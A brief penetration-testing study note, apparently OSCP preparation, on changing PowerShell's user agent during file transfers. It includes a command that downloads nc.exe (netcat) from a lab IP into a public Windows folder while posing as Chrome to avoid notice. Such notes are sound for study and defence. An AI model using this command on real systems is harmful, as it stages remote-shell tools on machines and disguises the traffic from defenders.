---
permalink: oscp/techniques/file-transfer/untitled-6
title: Untitled
type: note
---
## Changing User Agent

#### Listing User Agents
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

#### Example Request with Chrome User Agent
```bash
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome  Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
